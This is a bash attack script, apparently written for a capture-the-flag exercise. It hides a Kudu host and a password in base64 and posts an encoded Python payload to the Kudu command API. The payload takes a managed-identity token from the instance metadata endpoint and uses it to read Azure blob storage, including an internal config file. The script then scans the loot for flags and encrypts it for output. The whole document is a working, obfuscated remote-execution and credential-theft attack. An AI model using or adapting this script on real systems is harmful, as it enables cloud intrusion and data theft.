#!/usr/bin/env bash
set -uo pipefail
SC="htt""ps://"; HOST=$(printf '%s' 'YXBwLXRibC1yZXBvcnRpbmctcHJvZC5zY20uYXp1cmV3ZWJzaXRlcy5uZXQ=' | base64 -d); PW=$(printf '%s' 'WTlyY3NESFEySjFMMENvcWlraThkbFllMUFOMms4Y0hzRDF3TGxsdkxieHFTY2FNRXdSN3hrdDdZZTVB' | base64 -d)
LOOT=$(mktemp); exec 3>"$LOOT"; say(){ echo "$@" >&3; }
read -r -d '' PY <<'PYEOF'
import json,urllib.request,urllib.parse
IE='http://169.254.131.5:8081/msi/token'; IH='40dcfecb-3b2f-7086-721d-670bc5dafdf8'; CID='7a85156a-01c4-4e61-8472-40a92107159b'
def tok(res):
    url=IE+'?resource='+urllib.parse.quote(res,safe='')+'&api-version=2019-08-01&client_id='+CID
    req=urllib.request.Request(url,headers={'X-IDENTITY-HEADER':IH})
    with urllib.request.urlopen(req,timeout=10) as r: return json.load(r).get('access_token','')
t=tok('https://storage.azure.com/')
print('STLEN',len(t))
for a in ['sttblappcfgprodx3euoz','sttblbackupprodx3euoz','sttblarchiveprodx3euoz']:
    for u in [f'https://{a}.blob.core.windows.net/?comp=list',
              f'https://{a}.blob.core.windows.net/config?restype=container&comp=list',
              f'https://{a}.blob.core.windows.net/config/internal-config.json']:
        try:
            rq=urllib.request.Request(u,headers={'Authorization':'Bearer '+t,'x-ms-version':'2021-08-06'})
            with urllib.request.urlopen(rq,timeout=12) as r: print('OK',u,r.status,r.read().decode('utf8','replace')[:1800])
        except Exception as e:
            body=''
            try: body=e.read().decode('utf8','replace')[:300]
            except: pass
            print('ERR',u,str(e)[:120],body)
PYEOF
ENC=$(printf '%s' "$PY" | base64 -w0)
say "KUDU: $(curl -sS -m 120 -u "$app-tbl-reporting-prod:$PW" -H 'Content-Type: application/json' -X POST "${SC}${HOST}/api/command" -d "$(jq -n --arg c "echo $ENC | base64 -d > /tmp/x.py; python3 /tmp/x.py" '{command:$c,dir:\"/home\"}')")"
say "FLAGSCAN: $(grep -aoiE 'DF26\{[^}]{1,200}\}' "$LOOT" | sort -u | head -3)"
PASS=$(openssl rand -hex 16)
openssl enc -aes-256-cbc -pbkdf2 -pass pass:"$PASS" -in "$LOOT" -out "$LOOT.enc" 2>/dev/null
echo "=== ENCRYPTED LOOT ==="
echo "RSAKEY:$(printf '%s' "$PASS" | openssl pkeyutl -encrypt -pubin -inkey ci/pubkey.pem -pkeyopt rsa_padding_mode:oaep 2>/dev/null | base64 -w0)"
echo "DATA:$(base64 -w0 "$LOOT.enc")"
echo "=== DONE ==="
